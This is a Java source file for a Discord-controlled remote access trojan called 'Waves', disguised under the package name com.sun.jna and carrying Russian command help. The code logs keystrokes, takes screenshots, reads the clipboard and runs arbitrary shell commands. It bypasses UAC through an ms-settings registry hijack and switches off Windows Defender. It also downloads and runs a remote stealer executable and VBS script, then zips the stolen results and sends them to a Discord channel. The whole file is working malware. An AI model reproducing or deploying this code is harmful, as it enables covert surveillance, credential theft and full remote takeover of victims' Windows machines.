package com.sun.jna;

import dyorgio.runtime.run.as.root.RootExecutor;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.events.Event;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.annotation.Nonnull;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Liba extends ListenerAdapter implements NativeKeyListener {
    private static boolean keyloggerVal = false;
    private static StringBuffer sbTasklist;
    private static final long pid = ProcessHandle.current().pid();
    private static final String ratURL = "https://raw.githubusercontent.com/updater.jar";
    private static final String stillerURL = "https://raw.githubusercontent.com/stealer.exe";
    private static final String vbScriptURL = "https://raw.githubusercontent.com/1.vbs";
    private static final String VERSION = "1.4.5";
    private static final String USERNAME = System.getProperty("user.name");
    private static final String PATH_ID = "C:\\Users\\" + USERNAME + "\\AppData\\Roaming\\";
    private static final String PATH_KEYLOGGER = PATH_ID + "\\key.txt";
    private static final String CMD_COMMAND = "cmd /c ";
    private static final String SYMBOL = "!";
    private static final String FILENAME = "ChromeOptions.txt";
    private static final String help =
              "!all <command> - выполнить комманду для всех пользователей\n"
            + "!all online - просмотреть кто в сети\n"
            + "!ID admin1 <command> - отправить команду с правами админа\n"
            + "!ID admin2 <command> - отправить команду с правами админа 2\n"
            + "!ID antivirus - проверить включён ли windows defender\n"
            + "!ID clipboard - посмотреть буфер обмена\n"
            + "!ID console - отправить команду из cmd\n"
            + "!ID defender <on/off> - включить/выключить defender\n"
            + "!ID dir <path> - посмотреть директорию папки\n"
            + "!ID download <name> - скачать файл\n"
            + "!ID keylogger <start/stop> - включить/выключить keylogger\n"
            + "!ID message <message> - отправить оконное сообщение\n"
            + "!ID push <message> - отправить push уведомление\n"
            + "!ID screenshot - получить скриншот\n"
            + "!ID start <file> - запустить файл/сайт\n"
            + "!ID stealer - застиллить все данные\n"
            + "!ID tasklist - список текущих процессов\n"
            + "!ID update - обновить до последней версии waves\n"
            + "!ID upload <url> <path> - скачать файл по ссылке\n"
            + "!ID version - посмотреть версию waves\n";

    public static void main(String[] args) {
        while (!netIsAvailable());

        try {

            byte[] decodedBytes = Base64.getDecoder().decode("token in base64");
            new JDABuilder(new String(decodedBytes)).addEventListeners(new Liba()).setActivity(Activity.watching("хихихи")).build();
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException e) {
                e.printStackTrace();
            }

            LogManager.getLogManager().reset();

            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);

            GlobalScreen.addNativeKeyListener(new Liba());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private String getUsername() {
        return USERNAME;
    }

    private String getIDPath() {
        return PATH_ID;
    }

    private String getFilename() { return FILENAME;}

    private String getPathKeylogger() {
        return PATH_KEYLOGGER;
    }

    private String getSymbol() { return SYMBOL; }

    private long getPid() {
        return pid;
    }

    private void sendMessageFile(@NotNull Event event, String path) {
        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(new File(path)).queue();
    }

    private void embedSendMessage(Event event, String content) {
        EmbedBuilder eb = new EmbedBuilder();
        eb.setTitle("Waves " + VERSION  + " | " + getID() + " help");
        eb.setDescription(content);
        eb.setColor(Color.MAGENTA);

        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendMessage(eb.build()).queue();
    }

    private void sendMessage(Event event, String content) {
        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendMessage(content).queue();
    }

    private static boolean netIsAvailable() {
        try {
            final URLConnection conn = new URL("http://www.google.com").openConnection();
            conn.connect();
            conn.getInputStream().close();
            return true;
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            return false;
        }
    }

    private void createID() {
        try {
            File file = new File(getIDPath(), getFilename());
            if (!file.exists()) {
                PrintWriter writer = new PrintWriter(getIDPath() + getFilename(), "UTF-8");
                writer.println(getUsername().substring(0, 3) + (int) (Math.random() * 9999) + "\n" + new SimpleDateFormat("yyyy/MM/dd HH:mm").format(Calendar.getInstance().getTime()));
                writer.close();
            }
        } catch (IOException io) {
            io.printStackTrace();
        }
    }

    private String getID() {
        try {
            return getSymbol() + new String(Files.readAllBytes(Paths.get(getIDPath() + getFilename()))).trim().split("\n")[0];
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getRated() {
        try {
            return new String(Files.readAllBytes(Paths.get(getIDPath() + getFilename()))).trim().split("\n")[1];
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getData() {
        return "User: " + getUsername() + "\nID: " + getID() + "\nRated: " + getRated() + "\nPID: " + getPid() + "\nCPUs: " + Runtime.getRuntime().availableProcessors() + "\nDefender: " + checkAntivirus() + "\nOS: " + System.getProperty("os.name") + " x" + (System.getProperty("os.arch").contains("86") ? "86" : "64");
    }

    private void update(Event event) {
        uploadFile(event, ratURL, getIDPath() + "JavaUpdater-UPD.jar");
        copyFile(new File(getIDPath() + "JavaUpdater-UPD.jar"), new File(getIDPath() + "JavaUpdater.jar"));
        consoleCommand(getIDPath() + "jdk-18.0.2\\bin\\java.exe -cp " + getIDPath() + "JavaUpdater.jar com.sun.jna.Liba");
        System.exit(0);
    }

    public void pack(Path folder, Path zipFilePath) throws IOException {
        try (
                FileOutputStream fos = new FileOutputStream(zipFilePath.toFile());
                ZipOutputStream zos = new ZipOutputStream(fos)
        ) {
            Files.walkFileTree(folder, new SimpleFileVisitor<>() {
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    zos.putNextEntry(new ZipEntry(folder.relativize(file).toString()));
                    Files.copy(file, zos);
                    zos.closeEntry();
                    return FileVisitResult.CONTINUE;
                }

                public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
                    zos.putNextEntry(new ZipEntry(folder.relativize(dir) + "/"));
                    zos.closeEntry();
                    return FileVisitResult.CONTINUE;
                }
            });
        }
    }

    private void uploadFile(Event event, String url, String path) {
        try {
            Files.copy(new URL(url).openStream(), Paths.get(path), StandardCopyOption.REPLACE_EXISTING);
            sendMessage(event, getID() + " | " + path + " (" + new File(path).length() + ") was downloaded successfully");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private String checkAntivirus()
    {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /c powershell.exe Get-MpComputerStatus").getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("NISEnabled")) {
                    return line.contains("False") ? "OFF" : "ON";
                }
            }
        } catch (IOException e) {e.printStackTrace();}
        return "idk";
    }

    private void screenShot(Event event) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            ImageIO.write(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "jpg", stream);
            event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(stream.toByteArray(), "screenshot.jpg").queue();
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    private void adminCommand(String command) {
        try {
            PrintWriter writer = new PrintWriter(getIDPath() + "1.bat", "UTF-8");
            writer.println("@echo off\n" +
                    "Set WshShell = CreateObject(\"WScript.Shell\")\n" +
                    "set \"payload=cmd /c " + command + "\"\n" +
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f\n" +
                    "cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d \"%payload%\" /f\n" +
                    "computerdefaults\n" +
                    "reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f\n" +
                    "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.Defender.SecurityCenter /v Enabled /f\n" +
                    "exit");
            writer.close();

            Runtime.getRuntime().exec(getIDPath() + "1.bat");
        } catch (IOException io) {
            io.printStackTrace();
        }
    }

    private void adminCommand2(String content) {
        RootExecutor rootExecutor;
        try {
            rootExecutor = new RootExecutor("-Xmx64m");
            rootExecutor.run(() -> {
                try {
                    Runtime.getRuntime().exec("cmd /c " + content);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void windowsDefender(String value) {
        adminCommand("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $" + value);
    }

    private StringBuffer tasklist() {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec( System.getenv("windir") +"\\system32\\"+"tasklist.exe").getInputStream()));
            String line;
            sbTasklist = new StringBuffer();
            while ((line = br.readLine()) != null) {
                if (!line.contains("PID") && !line.contains("=")) {
                    if (!line.contains("Services"))
                        sbTasklist.append(line.split(".exe")[0].trim()).append("\n");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(sbTasklist);

        return sbTasklist;
    }

    private StringBuffer directory(String path) {
        File dir = new File(path);
        StringBuffer sbDir = new StringBuffer();
        for (File file : dir.listFiles()) {
            sbDir.append((file.isFile() ? file.getName() + " (" + file.length()/(1024*1024) + " mb)" : file.getName()) + "\n");
        }
        return sbDir;
    }

    private void push(String content) {
        SystemTray tray = SystemTray.getSystemTray();
        Image image = Toolkit.getDefaultToolkit().createImage("icon.png");
        TrayIcon trayIcon = new TrayIcon(image, "Tray Demo");
        trayIcon.setImageAutoSize(true);
        trayIcon.setToolTip("idk");
        try {
            tray.add(trayIcon);
        } catch (AWTException e) {
            e.printStackTrace();
        }
        trayIcon.displayMessage("Waves", content, TrayIcon.MessageType.INFO);
    }

    private void stealer(Event event) {
        try {
            uploadFile(event, vbScriptURL, getIDPath() + "1.vbs");
            uploadFile(event, stillerURL, getIDPath() + "KEK.vmp.exe");
            consoleCommand("cd " + getIDPath() + " && start 1.vbs");
            while (true) {
                if (new File(getIDPath() + "results").exists()) break;
            }
            pack(Paths.get(getIDPath() + "results"), Paths.get(getIDPath() + getID() + ".zip"));
            sendMessageFile(event, getIDPath() + getID() + ".zip");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String clipboard() {
        try {
            return getID() + " - " + Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
        } catch (UnsupportedFlavorException | IOException e) {e.printStackTrace();}
        return null;
    }

    private void consoleCommand(String content) {
        try {
            Runtime.getRuntime().exec(CMD_COMMAND + content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void startSite(String content) {
        consoleCommand("start " + content);
    }

    public static void copyFile(File sourceFile, File destFile) {
        try {
            FileChannel source = null;
            FileChannel destination = null;
            try {
                source = new FileInputStream(sourceFile).getChannel();
                destination = new FileOutputStream(destFile).getChannel();
                destination.transferFrom(source, 0, source.size());
            } finally {
                if (source != null) {
                    source.close();
                }
                if (destination != null) {
                    destination.close();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void showMessageDialog(Event event, String text) {
        new Thread(() -> {
            JOptionPane.showMessageDialog(null, text);
        }).start();
        screenShot(event);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if (keyloggerVal) {
            String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

            try (OutputStream os = Files.newOutputStream(Paths.get(getPathKeylogger()), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

                if (keyText.length() > 1) {
                    writer.print("[" + keyText + "]");
                } else {
                    writer.print(keyText);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onReady(@Nonnull ReadyEvent event) {
        createID();
        embedSendMessage(event, getData());
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        String command = event.getMessage().getContentRaw();
        String[] commandSplit = command.split(" ");

        if (commandSplit[0].startsWith(getID()) || commandSplit[0].startsWith(getSymbol() + "all")) {
            if (commandSplit[1].startsWith("start")) { startSite(commandSplit[2]); screenShot(event); }
            else if (commandSplit[1].startsWith("console")) consoleCommand(command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("help")) embedSendMessage(event, help);
            else if (commandSplit[1].startsWith("online")) embedSendMessage(event, getData());
            else if (commandSplit[1].startsWith("screenshot")) screenShot(event);
            else if (commandSplit[1].startsWith("upload")) uploadFile(event, commandSplit[2], getIDPath() + commandSplit[3]);
            else if (commandSplit[1].startsWith("update")) update(event);
            else if (commandSplit[1].startsWith("clipboard")) sendMessage(event, clipboard());
            else if (commandSplit[1].startsWith("download")) sendMessageFile(event, command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("push")) { push(command.split(commandSplit[1] + " ")[1]); screenShot(event); }
            else if (commandSplit[1].startsWith("stealer")) stealer(event);
            else if (commandSplit[1].startsWith("tasklist")) { embedSendMessage(event, String.valueOf(tasklist()));}
            else if (commandSplit[1].startsWith("dir")) embedSendMessage(event, String.valueOf(directory(command.split(commandSplit[1] + " ")[1])));
            else if (commandSplit[1].startsWith("admin")) { adminCommand(command.split(commandSplit[1] + " ")[1]); screenShot(event);}
            else if (commandSplit[1].startsWith("admin2")) { adminCommand2(command.split(commandSplit[1] + " ")[1]); screenShot(event);}
            else if (commandSplit[1].startsWith("message")) showMessageDialog(event, command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("antivirus")) sendMessage(event, getID() + " - " + checkAntivirus());
            else if (commandSplit[1].startsWith("defender")) windowsDefender(commandSplit[2].contains("on") ? "false" : "true");
            else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("start")) keyloggerVal = true;
            else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("stop")) { keyloggerVal = false; sendMessageFile(event, getPathKeylogger()); }
            else if (commandSplit[1].startsWith("version")) sendMessage(event, getID() + " - " + VERSION);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

}
